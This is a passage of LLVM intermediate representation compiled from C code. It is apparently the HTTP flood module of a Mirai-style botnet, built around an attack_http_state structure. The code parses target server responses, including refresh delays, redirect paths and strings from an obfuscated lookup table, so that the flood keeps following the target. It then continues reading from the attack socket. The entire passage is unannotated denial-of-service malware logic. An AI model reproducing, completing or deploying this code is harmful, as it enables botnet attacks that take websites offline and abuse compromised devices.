  %1792 = icmp sge i32 %1791, 48
  br i1 %1792, label %1793, label %1801

1793:                                             ; preds = %1785
  %1794 = load i8*, i8** %57, align 8
  %1795 = load i32, i32* %10, align 4
  %1796 = sext i32 %1795 to i64
  %1797 = getelementptr inbounds i8, i8* %1794, i64 %1796
  %1798 = load i8, i8* %1797, align 1
  %1799 = sext i8 %1798 to i32
  %1800 = icmp sle i32 %1799, 57
  br label %1801

1801:                                             ; preds = %1793, %1785, %1777
  %1802 = phi i1 [ false, %1785 ], [ false, %1777 ], [ %1800, %1793 ]
  br i1 %1802, label %1803, label %1806

1803:                                             ; preds = %1801
  %1804 = load i32, i32* %10, align 4
  %1805 = add nsw i32 %1804, 1
  store i32 %1805, i32* %10, align 4
  br label %1777, !llvm.loop !17

1806:                                             ; preds = %1801
  %1807 = load i8*, i8** %57, align 8
  %1808 = load i32, i32* %10, align 4
  %1809 = sext i32 %1808 to i64
  %1810 = getelementptr inbounds i8, i8* %1807, i64 %1809
  %1811 = load i8, i8* %1810, align 1
  %1812 = sext i8 %1811 to i32
  %1813 = icmp ne i32 %1812, 0
  br i1 %1813, label %1814, label %2063

1814:                                             ; preds = %1806
  store i32 0, i32* %58, align 4
  %1815 = load i8*, i8** %57, align 8
  %1816 = load i32, i32* %10, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds i8, i8* %1815, i64 %1817
  store i8 0, i8* %1818, align 1
  %1819 = load i32, i32* %10, align 4
  %1820 = add nsw i32 %1819, 1
  store i32 %1820, i32* %10, align 4
  %1821 = load i8*, i8** %57, align 8
  %1822 = load i32, i32* %10, align 4
  %1823 = sext i32 %1822 to i64
  %1824 = getelementptr inbounds i8, i8* %1821, i64 %1823
  %1825 = load i8, i8* %1824, align 1
  %1826 = sext i8 %1825 to i32
  %1827 = icmp eq i32 %1826, 32
  br i1 %1827, label %1828, label %1831

1828:                                             ; preds = %1814
  %1829 = load i32, i32* %10, align 4
  %1830 = add nsw i32 %1829, 1
  store i32 %1830, i32* %10, align 4
  br label %1831

1831:                                             ; preds = %1828, %1814
  %1832 = load i8*, i8** %57, align 8
  %1833 = load i32, i32* %10, align 4
  %1834 = sext i32 %1833 to i64
  %1835 = getelementptr inbounds i8, i8* %1832, i64 %1834
  %1836 = load i8*, i8** %57, align 8
  %1837 = load i32, i32* %10, align 4
  %1838 = sext i32 %1837 to i64
  %1839 = getelementptr inbounds i8, i8* %1836, i64 %1838
  %1840 = call i32 @util_strlen(i8* noundef %1839)
  %1841 = call i32 @util_stristr(i8* noundef %1835, i32 noundef %1840, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %1842 = icmp ne i32 %1841, -1
  br i1 %1842, label %1843, label %1856

1843:                                             ; preds = %1831
  %1844 = load i8*, i8** %57, align 8
  %1845 = load i32, i32* %10, align 4
  %1846 = sext i32 %1845 to i64
  %1847 = getelementptr inbounds i8, i8* %1844, i64 %1846
  %1848 = load i8*, i8** %57, align 8
  %1849 = load i32, i32* %10, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds i8, i8* %1848, i64 %1850
  %1852 = call i32 @util_strlen(i8* noundef %1851)
  %1853 = call i32 @util_stristr(i8* noundef %1847, i32 noundef %1852, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %1854 = load i32, i32* %10, align 4
  %1855 = add nsw i32 %1854, %1853
  store i32 %1855, i32* %10, align 4
  br label %1856

1856:                                             ; preds = %1843, %1831
  %1857 = load i8*, i8** %57, align 8
  %1858 = load i32, i32* %10, align 4
  %1859 = sext i32 %1858 to i64
  %1860 = getelementptr inbounds i8, i8* %1857, i64 %1859
  %1861 = load i8, i8* %1860, align 1
  %1862 = sext i8 %1861 to i32
  %1863 = icmp eq i32 %1862, 34
  br i1 %1863, label %1864, label %1896

1864:                                             ; preds = %1856
  %1865 = load i32, i32* %10, align 4
  %1866 = add nsw i32 %1865, 1
  store i32 %1866, i32* %10, align 4
  %1867 = load i8*, i8** %57, align 8
  %1868 = load i32, i32* %10, align 4
  %1869 = sext i32 %1868 to i64
  %1870 = getelementptr inbounds i8, i8* %1867, i64 %1869
  %1871 = load i8*, i8** %57, align 8
  %1872 = load i32, i32* %10, align 4
  %1873 = sext i32 %1872 to i64
  %1874 = getelementptr inbounds i8, i8* %1871, i64 %1873
  %1875 = call i32 @util_strlen(i8* noundef %1874)
  %1876 = sub nsw i32 %1875, 1
  %1877 = sext i32 %1876 to i64
  %1878 = getelementptr inbounds i8, i8* %1870, i64 %1877
  %1879 = load i8, i8* %1878, align 1
  %1880 = sext i8 %1879 to i32
  %1881 = icmp eq i32 %1880, 34
  br i1 %1881, label %1882, label %1895

1882:                                             ; preds = %1864
  %1883 = load i8*, i8** %57, align 8
  %1884 = load i32, i32* %10, align 4
  %1885 = sext i32 %1884 to i64
  %1886 = getelementptr inbounds i8, i8* %1883, i64 %1885
  %1887 = load i8*, i8** %57, align 8
  %1888 = load i32, i32* %10, align 4
  %1889 = sext i32 %1888 to i64
  %1890 = getelementptr inbounds i8, i8* %1887, i64 %1889
  %1891 = call i32 @util_strlen(i8* noundef %1890)
  %1892 = sub nsw i32 %1891, 1
  %1893 = sext i32 %1892 to i64
  %1894 = getelementptr inbounds i8, i8* %1886, i64 %1893
  store i8 0, i8* %1894, align 1
  br label %1895

1895:                                             ; preds = %1882, %1864
  br label %1896

1896:                                             ; preds = %1895, %1856
  %1897 = load i8*, i8** %57, align 8
  %1898 = call i32 @util_atoi(i8* noundef %1897, i32 noundef 10)
  store i32 %1898, i32* %58, align 4
  br label %1899

1899:                                             ; preds = %1914, %1896
  %1900 = load i32, i32* %58, align 4
  %1901 = icmp sgt i32 %1900, 0
  br i1 %1901, label %1902, label %1912

1902:                                             ; preds = %1899
  %1903 = load i32, i32* %58, align 4
  %1904 = icmp slt i32 %1903, 10
  br i1 %1904, label %1905, label %1912

1905:                                             ; preds = %1902
  %1906 = load i32, i32* %27, align 4
  %1907 = load i32, i32* %58, align 4
  %1908 = add i32 %1906, %1907
  %1909 = zext i32 %1908 to i64
  %1910 = call i64 @time(i64* noundef null) #6
  %1911 = icmp sgt i64 %1909, %1910
  br label %1912

1912:                                             ; preds = %1905, %1902, %1899
  %1913 = phi i1 [ false, %1902 ], [ false, %1899 ], [ %1911, %1905 ]
  br i1 %1913, label %1914, label %1916

1914:                                             ; preds = %1912
  %1915 = call i32 @sleep(i32 noundef 1)
  br label %1899, !llvm.loop !18

1916:                                             ; preds = %1912
  %1917 = load i8*, i8** %57, align 8
  %1918 = load i32, i32* %10, align 4
  %1919 = sext i32 %1918 to i64
  %1920 = getelementptr inbounds i8, i8* %1917, i64 %1919
  store i8* %1920, i8** %57, align 8
  %1921 = load i8*, i8** %57, align 8
  %1922 = load i8*, i8** %57, align 8
  %1923 = call i32 @util_strlen(i8* noundef %1922)
  %1924 = call i32 @util_stristr(i8* noundef %1921, i32 noundef %1923, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  %1925 = icmp eq i32 %1924, 4
  br i1 %1925, label %1926, label %2016

1926:                                             ; preds = %1916
  store i32 7, i32* %10, align 4
  %1927 = load i8*, i8** %57, align 8
  %1928 = getelementptr inbounds i8, i8* %1927, i64 4
  %1929 = load i8, i8* %1928, align 1
  %1930 = sext i8 %1929 to i32
  %1931 = icmp eq i32 %1930, 115
  br i1 %1931, label %1932, label %1935

1932:                                             ; preds = %1926
  %1933 = load i32, i32* %10, align 4
  %1934 = add nsw i32 %1933, 1
  store i32 %1934, i32* %10, align 4
  br label %1935

1935:                                             ; preds = %1932, %1926
  %1936 = load i8*, i8** %57, align 8
  %1937 = load i8*, i8** %57, align 8
  %1938 = load i32, i32* %10, align 4
  %1939 = sext i32 %1938 to i64
  %1940 = getelementptr inbounds i8, i8* %1937, i64 %1939
  %1941 = load i32, i32* %56, align 4
  %1942 = load i32, i32* %10, align 4
  %1943 = sub nsw i32 %1941, %1942
  %1944 = sext i32 %1943 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 1 %1936, i8* align 1 %1940, i64 %1944, i1 false)
  store i32 0, i32* %10, align 4
  br label %1945

1945:                                             ; preds = %1966, %1935
  %1946 = load i8*, i8** %57, align 8
  %1947 = load i32, i32* %10, align 4
  %1948 = sext i32 %1947 to i64
  %1949 = getelementptr inbounds i8, i8* %1946, i64 %1948
  %1950 = load i8, i8* %1949, align 1
  %1951 = sext i8 %1950 to i32
  %1952 = icmp ne i32 %1951, 0
  br i1 %1952, label %1953, label %1969

1953:                                             ; preds = %1945
  %1954 = load i8*, i8** %57, align 8
  %1955 = load i32, i32* %10, align 4
  %1956 = sext i32 %1955 to i64
  %1957 = getelementptr inbounds i8, i8* %1954, i64 %1956
  %1958 = load i8, i8* %1957, align 1
  %1959 = sext i8 %1958 to i32
  %1960 = icmp eq i32 %1959, 47
  br i1 %1960, label %1961, label %1966

1961:                                             ; preds = %1953
  %1962 = load i8*, i8** %57, align 8
  %1963 = load i32, i32* %10, align 4
  %1964 = sext i32 %1963 to i64
  %1965 = getelementptr inbounds i8, i8* %1962, i64 %1964
  store i8 0, i8* %1965, align 1
  br label %1969

1966:                                             ; preds = %1953
  %1967 = load i32, i32* %10, align 4
  %1968 = add nsw i32 %1967, 1
  store i32 %1968, i32* %10, align 4
  br label %1945, !llvm.loop !19

1969:                                             ; preds = %1961, %1945
  %1970 = load i8*, i8** %57, align 8
  %1971 = call i32 @util_strlen(i8* noundef %1970)
  %1972 = icmp sgt i32 %1971, 0
  br i1 %1972, label %1973, label %1983

1973:                                             ; preds = %1969
  %1974 = load i8*, i8** %57, align 8
  %1975 = call i32 @util_strlen(i8* noundef %1974)
  %1976 = icmp slt i32 %1975, 128
  br i1 %1976, label %1977, label %1983

1977:                                             ; preds = %1973
  %1978 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1979 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1978, i32 0, i32 7
  %1980 = getelementptr inbounds [129 x i8], [129 x i8]* %1979, i64 0, i64 0
  %1981 = load i8*, i8** %57, align 8
  %1982 = call i32 @util_strcpy(i8* noundef %1980, i8* noundef %1981)
  br label %1983

1983:                                             ; preds = %1977, %1973, %1969
  %1984 = load i8*, i8** %57, align 8
  %1985 = load i32, i32* %10, align 4
  %1986 = add nsw i32 %1985, 1
  %1987 = sext i32 %1986 to i64
  %1988 = getelementptr inbounds i8, i8* %1984, i64 %1987
  %1989 = call i32 @util_strlen(i8* noundef %1988)
  %1990 = icmp slt i32 %1989, 256
  br i1 %1990, label %1991, label %2015

1991:                                             ; preds = %1983
  %1992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1992, i32 0, i32 6
  %1994 = getelementptr inbounds [257 x i8], [257 x i8]* %1993, i64 0, i64 0
  %1995 = getelementptr inbounds i8, i8* %1994, i64 1
  call void @util_zero(i8* noundef %1995, i32 noundef 255)
  %1996 = load i8*, i8** %57, align 8
  %1997 = load i32, i32* %10, align 4
  %1998 = add nsw i32 %1997, 1
  %1999 = sext i32 %1998 to i64
  %2000 = getelementptr inbounds i8, i8* %1996, i64 %1999
  %2001 = call i32 @util_strlen(i8* noundef %2000)
  %2002 = icmp sgt i32 %2001, 0
  br i1 %2002, label %2003, label %2014

2003:                                             ; preds = %1991
  %2004 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2004, i32 0, i32 6
  %2006 = getelementptr inbounds [257 x i8], [257 x i8]* %2005, i64 0, i64 0
  %2007 = getelementptr inbounds i8, i8* %2006, i64 1
  %2008 = load i8*, i8** %57, align 8
  %2009 = load i32, i32* %10, align 4
  %2010 = add nsw i32 %2009, 1
  %2011 = sext i32 %2010 to i64
  %2012 = getelementptr inbounds i8, i8* %2008, i64 %2011
  %2013 = call i32 @util_strcpy(i8* noundef %2007, i8* noundef %2012)
  br label %2014

2014:                                             ; preds = %2003, %1991
  br label %2015

2015:                                             ; preds = %2014, %1983
  br label %2056

2016:                                             ; preds = %1916
  %2017 = load i8*, i8** %57, align 8
  %2018 = getelementptr inbounds i8, i8* %2017, i64 0
  %2019 = load i8, i8* %2018, align 1
  %2020 = sext i8 %2019 to i32
  %2021 = icmp eq i32 %2020, 47
  br i1 %2021, label %2022, label %2055

2022:                                             ; preds = %2016
  %2023 = load i8*, i8** %57, align 8
  %2024 = load i32, i32* %10, align 4
  %2025 = add nsw i32 %2024, 1
  %2026 = sext i32 %2025 to i64
  %2027 = getelementptr inbounds i8, i8* %2023, i64 %2026
  %2028 = call i32 @util_strlen(i8* noundef %2027)
  %2029 = icmp slt i32 %2028, 256
  br i1 %2029, label %2030, label %2054

2030:                                             ; preds = %2022
  %2031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2031, i32 0, i32 6
  %2033 = getelementptr inbounds [257 x i8], [257 x i8]* %2032, i64 0, i64 0
  %2034 = getelementptr inbounds i8, i8* %2033, i64 1
  call void @util_zero(i8* noundef %2034, i32 noundef 255)
  %2035 = load i8*, i8** %57, align 8
  %2036 = load i32, i32* %10, align 4
  %2037 = add nsw i32 %2036, 1
  %2038 = sext i32 %2037 to i64
  %2039 = getelementptr inbounds i8, i8* %2035, i64 %2038
  %2040 = call i32 @util_strlen(i8* noundef %2039)
  %2041 = icmp sgt i32 %2040, 0
  br i1 %2041, label %2042, label %2053

2042:                                             ; preds = %2030
  %2043 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2044 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2043, i32 0, i32 6
  %2045 = getelementptr inbounds [257 x i8], [257 x i8]* %2044, i64 0, i64 0
  %2046 = getelementptr inbounds i8, i8* %2045, i64 1
  %2047 = load i8*, i8** %57, align 8
  %2048 = load i32, i32* %10, align 4
  %2049 = add nsw i32 %2048, 1
  %2050 = sext i32 %2049 to i64
  %2051 = getelementptr inbounds i8, i8* %2047, i64 %2050
  %2052 = call i32 @util_strcpy(i8* noundef %2046, i8* noundef %2051)
  br label %2053

2053:                                             ; preds = %2042, %2030
  br label %2054

2054:                                             ; preds = %2053, %2022
  br label %2055

2055:                                             ; preds = %2054, %2016
  br label %2056

2056:                                             ; preds = %2055, %2015
  %2057 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2058 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2057, i32 0, i32 9
  %2059 = getelementptr inbounds [9 x i8], [9 x i8]* %2058, i64 0, i64 0
  %2060 = call i8* @strcpy(i8* noundef %2059, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #6
  %2061 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2062 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2061, i32 0, i32 1
  store i8 10, i8* %2062, align 4
  br label %2543

2063:                                             ; preds = %1806
  br label %2064

2064:                                             ; preds = %2063, %1749
  br label %2065

2065:                                             ; preds = %2064, %1729
  %2066 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %2067 = load i32, i32* %12, align 4
  %2068 = call i32 @util_memsearch(i8* noundef %2066, i32 noundef %2067, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 noundef 4)
  store i32 %2068, i32* %37, align 4
  %2069 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2070 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2069, i32 0, i32 9
  %2071 = getelementptr inbounds [9 x i8], [9 x i8]* %2070, i64 0, i64 0
  %2072 = call signext i8 @util_strcmp(i8* noundef %2071, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %2073 = sext i8 %2072 to i32
  %2074 = icmp ne i32 %2073, 0
  br i1 %2074, label %2082, label %2075

2075:                                             ; preds = %2065
  %2076 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2076, i32 0, i32 9
  %2078 = getelementptr inbounds [9 x i8], [9 x i8]* %2077, i64 0, i64 0
  %2079 = call signext i8 @util_strcmp(i8* noundef %2078, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %2080 = sext i8 %2079 to i32
  %2081 = icmp ne i32 %2080, 0
  br i1 %2081, label %2082, label %2085

2082:                                             ; preds = %2075, %2065
  %2083 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2084 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2083, i32 0, i32 1
  store i8 7, i8* %2084, align 4
  br label %2096

2085:                                             ; preds = %2075
  %2086 = load i32, i32* %12, align 4
  %2087 = load i32, i32* %37, align 4
  %2088 = icmp sgt i32 %2086, %2087
  br i1 %2088, label %2089, label %2092

2089:                                             ; preds = %2085
  %2090 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2091 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2090, i32 0, i32 1
  store i8 10, i8* %2091, align 4
  br label %2095

2092:                                             ; preds = %2085
  %2093 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2094 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2093, i32 0, i32 1
  store i8 1, i8* %2094, align 4
  br label %2095

2095:                                             ; preds = %2092, %2089
  br label %2096

2096:                                             ; preds = %2095, %2082
  %2097 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2098 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2097, i32 0, i32 0
  %2099 = load i32, i32* %2098, align 4
  %2100 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %2101 = load i32, i32* %37, align 4
  %2102 = sext i32 %2101 to i64
  %2103 = call i64 @recv(i32 noundef %2099, i8* noundef %2100, i64 noundef %2102, i32 noundef 16384)
  %2104 = trunc i64 %2103 to i32
  store i32 %2104, i32* %12, align 4
  br label %2541

2105:                                             ; preds = %1136
  %2106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2106, i32 0, i32 1
  %2108 = load i8, i8* %2107, align 4
  %2109 = zext i8 %2108 to i32
  %2110 = icmp eq i32 %2109, 7
  br i1 %2110, label %2111, label %2488

2111:                                             ; preds = %2105
  br label %2112

2112:                                             ; preds = %2486, %2111
  %2113 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2114 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2113, i32 0, i32 1
  %2115 = load i8, i8* %2114, align 4
  %2116 = zext i8 %2115 to i32
  %2117 = icmp ne i32 %2116, 7
  br i1 %2117, label %2118, label %2119

2118:                                             ; preds = %2112
  br label %2487

2119:                                             ; preds = %2112
  %2120 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2121 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2120, i32 0, i32 17
  %2122 = load i32, i32* %2121, align 4
  %2123 = icmp eq i32 %2122, 1024
  br i1 %2123, label %2124, label %2136

2124:                                             ; preds = %2119
  %2125 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2126 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2125, i32 0, i32 18
  %2127 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2126, i64 0, i64 0
  %2128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2128, i32 0, i32 18
  %2130 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2129, i64 0, i64 0
  %2131 = getelementptr inbounds i8, i8* %2130, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 4 %2127, i8* align 1 %2131, i64 960, i1 false)
  %2132 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2132, i32 0, i32 17
  %2134 = load i32, i32* %2133, align 4
  %2135 = sub nsw i32 %2134, 64
  store i32 %2135, i32* %2133, align 4
  br label %2136

2136:                                             ; preds = %2124, %2119
  %2137 = call i32* @__errno_location() #7
  store i32 0, i32* %2137, align 4
  %2138 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2139 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2138, i32 0, i32 0
  %2140 = load i32, i32* %2139, align 4
  %2141 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2142 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2141, i32 0, i32 18
  %2143 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2142, i64 0, i64 0
  %2144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2144, i32 0, i32 17
  %2146 = load i32, i32* %2145, align 4
  %2147 = sext i32 %2146 to i64
  %2148 = getelementptr inbounds i8, i8* %2143, i64 %2147
  %2149 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2150 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2149, i32 0, i32 17
  %2151 = load i32, i32* %2150, align 4
  %2152 = sub nsw i32 1024, %2151
  %2153 = sext i32 %2152 to i64
  %2154 = call i64 @recv(i32 noundef %2140, i8* noundef %2148, i64 noundef %2153, i32 noundef 16384)
  %2155 = trunc i64 %2154 to i32
  store i32 %2155, i32* %12, align 4
  %2156 = load i32, i32* %12, align 4
  %2157 = icmp eq i32 %2156, 0
  br i1 %2157, label %2158, label %2160

2158:                                             ; preds = %2136
  %2159 = call i32* @__errno_location() #7
  store i32 104, i32* %2159, align 4
  store i32 -1, i32* %12, align 4
  br label %2160

2160:                                             ; preds = %2158, %2136
  %2161 = load i32, i32* %12, align 4
  %2162 = icmp eq i32 %2161, -1
  br i1 %2162, label %2163, label %2181

2163:                                             ; preds = %2160
  %2164 = call i32* @__errno_location() #7
  %2165 = load i32, i32* %2164, align 4
  %2166 = icmp ne i32 %2165, 11
  br i1 %2166, label %2167, label %2180

2167:                                             ; preds = %2163
  %2168 = call i32* @__errno_location() #7
  %2169 = load i32, i32* %2168, align 4
  %2170 = icmp ne i32 %2169, 11
  br i1 %2170, label %2171, label %2180

2171:                                             ; preds = %2167
  %2172 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2172, i32 0, i32 0
  %2174 = load i32, i32* %2173, align 4
  %2175 = call i32 @close(i32 noundef %2174)
  %2176 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2176, i32 0, i32 0
  store i32 -1, i32* %2177, align 4
  %2178 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2179 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2178, i32 0, i32 1
  store i8 0, i8* %2179, align 4
  br label %2180

2180:                                             ; preds = %2171, %2167, %2163
  br label %2487

2181:                                             ; preds = %2160
  %2182 = load i32, i32* %12, align 4
  %2183 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2184 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2183, i32 0, i32 17
  %2185 = load i32, i32* %2184, align 4
  %2186 = add nsw i32 %2185, %2182
  store i32 %2186, i32* %2184, align 4
  %2187 = load i32, i32* %27, align 4
  %2188 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2188, i32 0, i32 2
  store i32 %2187, i32* %2189, align 4
  br label %2190

2190:                                             ; preds = %2485, %2181
  store i32 0, i32* %59, align 4
  %2191 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2192 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2191, i32 0, i32 14
  %2193 = load i32, i32* %2192, align 4
  %2194 = icmp sgt i32 %2193, 0
  br i1 %2194, label %2195, label %2366

2195:                                             ; preds = %2190
  %2196 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2196, i32 0, i32 14
  %2198 = load i32, i32* %2197, align 4
  %2199 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2199, i32 0, i32 17
  %2201 = load i32, i32* %2200, align 4
  %2202 = icmp sgt i32 %2198, %2201
  br i1 %2202, label %2203, label %2207

2203:                                             ; preds = %2195
  %2204 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2204, i32 0, i32 17
  %2206 = load i32, i32* %2205, align 4
  br label %2211

2207:                                             ; preds = %2195
  %2208 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2209 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2208, i32 0, i32 14
  %2210 = load i32, i32* %2209, align 4
  br label %2211

2211:                                             ; preds = %2207, %2203
  %2212 = phi i32 [ %2206, %2203 ], [ %2210, %2207 ]
  store i32 %2212, i32* %59, align 4
  %2213 = load i32, i32* %59, align 4
  %2214 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2215 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2214, i32 0, i32 14
  %2216 = load i32, i32* %2215, align 4
  %2217 = sub nsw i32 %2216, %2213
  store i32 %2217, i32* %2215, align 4
  %2218 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2219 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2218, i32 0, i32 11
  %2220 = load i32, i32* %2219, align 4
  %2221 = icmp eq i32 %2220, 1
  br i1 %2221, label %2222, label %2365

2222:                                             ; preds = %2211
  %2223 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2223, i32 0, i32 18
  %2225 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2224, i64 0, i64 0
  %2226 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2226, i32 0, i32 17
  %2228 = load i32, i32* %2227, align 4
  %2229 = call i8* @table_retrieve_val(i32 noundef 61, i32* noundef null)
  %2230 = call i32 @util_memsearch(i8* noundef %2225, i32 noundef %2228, i8* noundef %2229, i32 noundef 11)
  %2231 = icmp ne i32 %2230, -1
  br i1 %2231, label %2232, label %2364

2232:                                             ; preds = %2222
  %2233 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2234 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2233, i32 0, i32 18
  %2235 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2234, i64 0, i64 0
  %2236 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2236, i32 0, i32 17
  %2238 = load i32, i32* %2237, align 4
  %2239 = call i8* @table_retrieve_val(i32 noundef 61, i32* noundef null)
  %2240 = call i32 @util_memsearch(i8* noundef %2235, i32 noundef %2238, i8* noundef %2239, i32 noundef 11)
  store i32 %2240, i32* %60, align 4
  %2241 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2242 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2241, i32 0, i32 18
  %2243 = load i32, i32* %60, align 4
  %2244 = sext i32 %2243 to i64
  %2245 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2242, i64 0, i64 %2244
  %2246 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2246, i32 0, i32 17
  %2248 = load i32, i32* %2247, align 4
  %2249 = load i32, i32* %60, align 4
  %2250 = sub nsw i32 %2248, %2249
  %2251 = call i32 @util_memsearch(i8* noundef %2245, i32 noundef %2250, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 noundef 1)
  store i32 %2251, i32* %61, align 4
  %2252 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2253 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2252, i32 0, i32 18
  %2254 = load i32, i32* %60, align 4
  %2255 = load i32, i32* %61, align 4
  %2256 = sub nsw i32 %2255, 1
  %2257 = add nsw i32 %2254, %2256
  %2258 = sext i32 %2257 to i64
  %2259 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2253, i64 0, i64 %2258
  store i8 0, i8* %2259, align 1
  %2260 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2260, i32 0, i32 15
  %2262 = load i32, i32* %2261, align 4
  %2263 = icmp slt i32 %2262, 5
  br i1 %2263, label %2264, label %2359

2264:                                             ; preds = %2232
  %2265 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
